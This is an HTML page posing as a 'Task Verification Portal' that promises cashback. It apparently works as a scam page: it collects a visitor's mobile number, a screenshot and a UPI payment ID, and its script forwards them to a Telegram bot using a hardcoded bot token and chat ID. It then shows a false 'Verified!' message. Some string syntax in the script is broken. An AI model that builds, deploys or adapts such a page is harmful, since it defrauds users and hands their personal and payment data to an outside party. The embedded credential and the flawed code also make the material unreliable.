<!DOCTYPE html>
<html lang="hi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Task Verification Portal</title>
<style>
  :root {
    --primary: #6200ea;
    --primary-gradient: linear-gradient(135deg, #7c4dff, #6200ea);
    --secondary: #f5f5f7;
    --accent: #00e676;
  }
  body {
    font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
    background-color: #e0e0e0;
    margin: 0;
    padding: 15px;
    display: flex;
    justify-content: center;
  }
  .container {
    background: white;
    width: 100%;
    max-width: 450px;
    border-radius: 25px;
    box-shadow: 0 15px 35px rgba(0,0,0,0.2);
    overflow: hidden;
  }
  .header {
    background: var(--primary-gradient);
    color: white;
    padding: 30px 20px;
    text-align: center;
    border-bottom-left-radius: 30px;
    border-bottom-right-radius: 30px;
  }
  .header h1 { margin: 0; font-size: 26px; letter-spacing: 0.5px; }
  .header p { margin: 8px 0 0; opacity: 0.9; font-size: 15px; }
  
  .demo-container {
    padding: 20px;
    background: var(--secondary);
    display: flex;
    gap: 10px;
    justify-content: center;
  }
  .demo-box {
    background: white;
    padding: 10px;
    border-radius: 15px;
    box-shadow: 0 4px 10px rgba(0,0,0,0.05);
    text-align: center;
    width: 48%;
  }
  .demo-label {
    font-weight: bold;
    color: #311b92;
    font-size: 11px;
    text-transform: uppercase;
    display: block;
    margin-bottom: 8px;
  }
  .demo-img {
    width: 100%;
    height: 140px;
    object-fit: cover;
    border-radius: 10px;
    border: 1px solid #d1d5db;
  }

  form { padding: 25px; }
  .form-group { margin-bottom: 22px; }
  label {
    display: block;
    margin-bottom: 8px;
    font-weight: 600;
    color: #374151;
    font-size: 14px;
  }
  input[type="text"], input[type="file"] {
    width: 100%;
    padding: 14px;
    border: 2px solid #e5e7eb;
    border-radius: 12px;
    box-sizing: border-box;
    font-size: 16px;
    transition: border-color 0.3s;
    background-color: #f9fafb;
  }
  input[type="text"]:focus {
    border-color: #7c4dff;
    outline: none;
    background-color: white;
  }
  input[type="file"] {
    padding: 12px;
    cursor: pointer;
  }
  
  button {
    width: 100%;
    padding: 16px;
    background: var(--primary-gradient);
    color: white;
    border: none;
    border-radius: 12px;
    font-size: 18px;
    font-weight: bold;
    cursor: pointer;
    box-shadow: 0 6px 20px rgba(124, 77, 255, 0.4);
    transition: transform 0.2s, filter 0.2s;
  }
  button:hover { filter: brightness(1.1); }
  button:active { transform: scale(0.98); }

  #successScreen {
    display: none;
    padding: 50px 20px;
    text-align: center;
  }
  .success-icon {
    width: 80px;
    height: 80px;
    background-color: #e8f5e9;
    color: var(--accent);
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 45px;
    margin: 0 auto 20px;
    animation: popIn 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
  }
  @keyframes popIn {
    0% { transform: scale(0); }
    80% { transform: scale(1.1); }
    100% { transform: scale(1); }
  }
  #successScreen h2 { color: #2e7d32; margin-bottom: 10px; font-size: 28px; }
  #successScreen p { color: #5c6bc0; font-size: 16px; margin: 5px 0; }
  .pulse-text {
    font-weight: bold;
    color: #e91e63;
    animation: pulse 1.5s infinite;
    margin-top: 15px !important;
  }
  @keyframes pulse {
    0% { opacity: 1; }
    50% { opacity: 0.3; }
    100% { opacity: 1; }
  }
</style>
</head>
<body>

<div class="container">
  <div id="formContainer">
    <div class="header">
      <h1>Emergent AI Task</h1>
      <p>Complete steps and verify below</p>
    </div>
    
    <div class="demo-container">
      <div class="demo-box">
        <span class="demo-label">Step 1 Preview</span>
        <img src="https://ibb.co/9H0x2y65" alt="Step 1" class="demo-img">
      </div>
      <div class="demo-box">
        <span class="demo-label">Step 2 Preview</span>
        <img src="https://ibb.co/20RCZj87" alt="Step 2" class="demo-img">
      </div>
    </div>

    <form id="verifyForm">
      <div class="form-group">
        <label>Registered Number</label>
        <input type="text" id="phone" required placeholder="Enter mobile number">
      </div>
      <div class="form-group">
        <label>Submit Screenshot</label>
        <input type="file" id="screenshot" accept="image/*" required>
      </div>
      <div class="form-group">
        <label>Enter Same UPI ID</label>
        <input type="text" id="upi" required placeholder="Match the UPI ID">
      </div>
      <button type="submit">SUBMIT VERIFICATION</button>
    </form>
  </div>

  <div id="successScreen">
    <div class="success-icon">✓</div>
    <h2>Verified!</h2>
    <p>Task details submitted successfully.</p>
    <p class="pulse-text">Wait 12-24 hours for cashback!</p>
  </div>
</div>

<script>
  document.getElementById('verifyForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    const botToken = '8563241235:AAF9W8L6LyuQ9PkEVWZ0b-5EFBLmabrUxvY';
    const chatId = '-1004393424619';
    
    const phone = document.getElementById('phone').value;
    const upi = document.getElementById('upi').value;
    const fileInput = document.getElementById('screenshot').files[0];

    const submitBtn = e.target.querySelector('button');
    submitBtn.disabled = true;
    submitBtn.innerText = 'Verifying...';

    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', fileInput);
    formData.append('caption', 🚀 NEW TASK SUBMISSION!\n\n📞 रजिस्टर्ड नंबर: ${phone}\n💳 UPI ID: ${upi});

    try {
      const response = await fetch(https://api.telegram.org/bot${botToken}/sendPhoto, {
        method: 'POST',
        body: formData
      });
      if (response.ok) {
        document.getElementById('formContainer').style.display = 'none';
        document.getElementById('successScreen').style.display = 'block';
      } else {
        const errData = await response.json();
        console.error('Telegram Error:', errData);
        alert('Submission failed. Please check your Bot Token and Chat ID.');
        submitBtn.disabled = false;
        submitBtn.innerText = 'SUBMIT VERIFICATION';
      }
    } catch (error) {
      console.error('Network Error:', error);
      alert('Network error. Please check your internet connection.');
      submitBtn.disabled = false;
      submitBtn.innerText = 'SUBMIT VERIFICATION';
    }
  });
</script>

</body>
</html>
